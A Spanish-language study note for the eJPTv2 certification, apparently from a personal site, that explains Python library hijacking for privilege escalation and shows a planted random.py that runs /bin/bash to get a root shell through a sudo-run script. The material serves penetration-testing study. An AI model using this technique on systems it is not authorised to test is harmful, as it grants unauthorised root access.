---
layout: default
title: Preparación EJPTv2
---

# Python Library Hijacking

Python Library Hijacking es una técnica de escalamiento de privilegios que explota la manera en que Python busca y carga módulos cuando se utiliza import. Si un script Python se ejecuta con permisos elevados (por ejemplo, usando sudo) y el atacante puede colocar un archivo con el mismo nombre que un módulo importado en una ruta que Python revisa antes que la librería original, el código del atacante se ejecuta con esos permisos elevados.

## 🕵️Cómo funciona:

- Cuando un script Python ejecuta import modulo, Python busca el módulo siguiendo este orden:

    - El directorio actual donde se ejecuta el script.
    - Las rutas listadas en la variable de entorno PYTHONPATH.
    - Las librerías instaladas en el sistema (por ejemplo, /usr/lib/python3.x/...).
- Si colocas un archivo llamado modulo.py en el directorio actual antes que la librería real, Python cargará tu archivo en lugar del original.
- Si el script se ejecuta con privilegios elevados, tu código malicioso se ejecutará también con esos privilegios, permitiéndote, por ejemplo, obtener una shell como root.

---

## Ejemplo práctico:

Supongamos que hay un script vulnerable que importa random:

```bash
# randombase64.py
import random
print("Hola mundo")
```

Si tienes permisos de ejecución con sudo, puedes crear un archivo malicioso llamado random.py en el mismo directorio:

```bash
# random.py
import os
os.system("/bin/bash")  # Esto se ejecutará como root
```

Luego, al ejecutar:

```bash
sudo python3 /home/usuario/randombase64.py
```

Se abrirá una bash con privilegios root, porque Python cargó tu módulo malicioso en lugar del random original.

---


<div style="text-align:center; font-size: 0.9em; margint-top: 40px; color: #33ff33;">
    💻 Hecho con 💚 por <strong>Marcela</strong> - 2025
</div>
